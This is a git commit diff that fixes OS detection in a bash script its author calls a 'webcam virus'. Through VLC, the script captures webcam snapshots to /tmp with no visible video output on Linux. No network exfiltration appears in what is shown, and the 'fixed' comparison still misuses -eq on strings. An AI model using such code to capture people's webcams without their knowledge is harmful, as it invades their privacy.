4e8c66cb616c535174703f0fa9d2602ffa5e7304
Carlos Bartolomeu <carlosgbartolomeu@gmail.com>
2013-12-13 11:01:25 +0000

    bugfix: webcam virus now works for linux

--- virus/WebcamVirus.bash
+++ virus/WebcamVirus.bash
@@ -1,5 +1,5 @@
 
-if [[ uname -eq 'Darwin' ]]; then
+if [[ `uname` -eq 'Darwin' ]]; then
 	VLCPATH='/Applications/VLC.app/Contents/MacOS/lib'
 	VLCJPATH='vlcj-2.4.1/jna-3.5.2.jar:vlcj-2.4.1/platform-3.5.2.jar:vlcj-2.4.1/vlcj-2.4.1.jar:.'
 	WEBCAM_OSX_PATH='qtcapture://'
@@ -14,7 +14,7 @@ if [[ uname -eq 'Darwin' ]]; then
 		watch -n 3 open saved.png;
 	done
 
-elif [[ uname -eq 'Linux' ]]; then
+elif [[ `uname` -eq 'Linux' ]]; then
 	cvlc v4l2:///dev/video0 --video-filter=scene --vout=dummy --scene-ratio=150 \
 			--scene-prefix=img --scene-path=/tmp/ vlc://quit
 fi
